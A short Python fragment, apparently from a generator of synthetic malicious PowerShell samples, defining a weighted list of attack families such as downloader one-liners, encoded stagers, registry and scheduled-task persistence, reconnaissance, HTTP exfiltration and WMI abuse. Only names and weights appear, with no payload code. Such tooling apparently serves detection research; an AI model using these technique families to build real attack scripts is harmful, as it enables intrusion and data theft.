    lines += _extras(rng, rng.randint(1, 3))
    return _coerce_long(lines, rng)


FAMILIES = [
    ("downloader_oneliner", 9, build_downloader_oneliner),
    ("structured_downloader", 7, build_structured_downloader),
    ("iex_downloadstring", 9, build_iex_downloadstring),
    ("encoded_stager", 8, build_encoded_stager),
    ("addtype_loader", 6, build_addtype_loader),
    ("assembly_loader", 5, build_assembly_loader),
    ("registry_persistence", 7, build_registry_persistence),
    ("scheduled_task", 7, build_scheduled_task),
    ("domain_recon", 6, build_domain_recon),
    ("network_recon", 6, build_network_recon),
    ("http_exfil", 6, build_http_exfil),
    ("wmi_lolbin", 8, build_wmi_lolbin),
]
